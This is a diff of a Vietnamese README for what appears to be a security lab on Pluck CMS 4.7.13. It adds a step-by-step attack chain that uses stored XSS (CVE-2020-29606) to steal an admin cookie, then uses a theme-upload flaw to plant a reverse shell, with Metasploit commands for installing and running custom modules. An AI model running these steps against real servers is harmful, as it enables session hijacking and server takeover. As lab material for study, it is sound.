@@ -9,12 +9,9 @@
 
 ## 📑 Mục lục
 - [Giới thiệu](#-giới-thiệu)
+- [Cấu trúc thư mục](#-cấu-trúc-thư-mục)
 - [Phân tích kỹ thuật](#-phân-tích-kỹ-thuật)
-- [Cài đặt môi trường](#-cài-đặt-môi-trường)
 - [Hướng dẫn khai thác](#-hướng-dẫn-khai-thác)
-- [Kết quả Demo](#-kết-quả-demo)
-- [Disclaimer](#-disclaimer)
-
 ---
 
 ## 📖 Giới thiệu
@@ -26,8 +23,21 @@ Kẻ tấn công (đã có quyền đăng nhập) có thể chèn mã JavaScript
 * **Mục tiêu:** Pluck CMS 4.7.13
 * **Loại lỗi:** Stored XSS (Authenticated)
 * **Module Metasploit:** `exploit/linux/http/cve_2020_29606_xss`
-
 ---
+
+## 📂 Cấu trúc thư mục
+
+```text
+.
+├── xss_basic/              # Demo các lỗi XSS cơ bản (Reflected, DOM, Stored)
+├── CMS/                    # Chứa mã nguồn và dữ liệu của CVE
+├── modules/
+│   ├── pluck_xss.rb        # Module 1: Stored XSS (CVE-2020-29606)
+│   └── pluck_cms_theme_rce.rb # Module 2: RCE via Theme Upload (CVE-2020-29607)
+├── docker-compose.yml      # File cấu hình môi trường Lab
+└── README.md               # Tài liệu hướng dẫn
+
+```
 
 ## 🔍 Phân tích kỹ thuật
 
@@ -45,5 +55,47 @@ if (isset($_POST['create_album'])) {
     // ❌ LỖI BẢO MẬT: Biến $album_name được sử dụng trực tiếp.
     // Nếu kẻ tấn công nhập: <script>alert(1)</script>
     // Hệ thống sẽ hiểu đây là code thực thi thay vì văn bản thuần.
-    
-    save_album_to_db($
+```
+## ⚔️ Hướng dẫn Khai thác & Demo (Full Chain)
+
+Dự án thực hiện kịch bản tấn công chuỗi (Kill-chain):
+1.  **Giai đoạn 1 (XSS):** Tấn công Stored XSS để chiếm quyền điều khiển (Session Hijacking).
+2.  **Giai đoạn 2 (RCE):** Sử dụng phiên làm việc đã chiếm được để upload mã độc (Reverse Shell) và chiếm quyền server.
+
+### 📍 Giai đoạn 1: Stored XSS (CVE-2020-29606)
+
+**Mục tiêu:** Chèn mã độc vào Album ảnh để đánh cắp Cookie của Admin.
+
+1.  **Cài đặt module:**
+    ```bash
+    cp modules/pluck_xss.rb ~/.msf4/modules/auxiliary/scanner/http/plunk_xss.rb
+    ```
+
+2.  **Thực hiện tấn công:**
+    ```bash
+    msfconsole
+    use auxiliary/scanner/http/plunk_xss
+    set RHOSTS ip_cve
+    RUN
+    ```
+    ✅ **Kết quả:** Payload XSS được lưu vào DB. Khi Admin truy cập, Cookie sẽ bị lộ.
+
+---
+### 📍 Giai đoạn 2: Remote Code Execution (RCE)
+
+**Mục tiêu:** Sau khi có quyền truy cập (hoặc giả lập đã có quyền), sử dụng lỗ hổng trong tính năng "Theme Edit" để thực thi mã từ xa.
+
+1.  **Cài đặt module:**
+    ```bash
+    cp modules/pluck_cms_theme_rce.rb ~/.msf4/modules/exploits/linux/http/pluck_cms_theme_rce.rb
+    ```
+
+2.  **Thực hiện tấn công:**
+    ```bash
+    msfconsole
+    use exploits/linux/http/pluck_cms_theme_rce
+    set RHOSTS ip_cve
+    set COOKIE_SESSION
+    exploit
+    ```
+    ✅ **Kết quả:** RCE vào được server .
